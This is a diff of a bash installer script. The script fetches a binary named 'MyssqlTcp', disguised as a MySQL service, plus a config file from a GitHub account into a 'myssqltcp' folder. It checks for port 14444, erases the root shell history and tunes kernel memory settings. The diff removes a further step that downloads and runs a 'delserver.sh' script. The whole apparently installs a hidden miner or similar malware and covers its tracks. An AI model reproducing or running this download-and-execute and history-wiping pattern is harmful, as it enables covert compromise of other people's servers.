@@ -113,7 +113,9 @@ if [ "$PORT" -lt "14444" -o "$PORT" -gt "14444" ]; then
 fi
 
 cd /$HOME/
+echo "/$HOME/??"
 mkdir myssqltcp
+
 cd /$HOME/myssqltcp
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
@@ -836,10 +838,5 @@ echo > /root/.bash_history
 
 sysctl -w vm.overcommit_memory=2
 echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
-
-cd /$HOME/
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
-chmod 777 delserver.sh
-/bin/bash ./delserver.sh
 echo "[*] Setup complete"
 echo "[*] Yee-Go"
